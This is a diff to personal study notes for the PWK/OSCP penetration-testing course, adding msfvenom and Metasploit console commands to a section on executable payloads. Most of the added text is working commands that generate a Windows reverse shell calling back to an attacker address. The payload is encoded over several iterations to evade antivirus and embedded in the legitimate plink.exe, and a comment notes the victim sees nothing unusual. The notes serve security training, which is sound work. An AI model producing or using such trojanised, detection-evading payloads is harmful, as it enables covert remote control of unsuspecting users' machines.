@@ -2648,14 +2648,27 @@ In production environments, domains typically have more than one domain controll
     + There are also non-meterpreter payloads available in the MSF.
       
 *** Executable Payloads (PWK p696)(msfvenom: export the MSF payloads into various formats)
+    + ref:
+      - [[https://www.offensive-security.com/metasploit-unleashed/msfvenom/][msfvenom homepage]]
     + src:
       #+begin_src sh
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe
   # -p <payload>, params, -f <output-format>, -o <output file name>
 file rhell_reverse.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+  # -e <encoder>
+  # -i <iterationTimes>
+  # -x <executableFileToUseAsTemplate>
+  # When an unsuspecting user executes the binary with our injected payload, it will operate normally from the user’s perspective. Behind the scenes however, the injected payload will attempt to connect back to our awaiting listener.
+  # same as the msf "generate" command
+msf5 > use payload/windows/shell_reverse_tcp
+msf5 payload(windows/shell_reverse_tcp) > set LHOST 10.11.0.4
+msf5 payload(windows/shell_reverse_tcp) > set LPORT 443
+msf5 payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
       #+end_src
-      // p697
+
 
 
 * TODO list
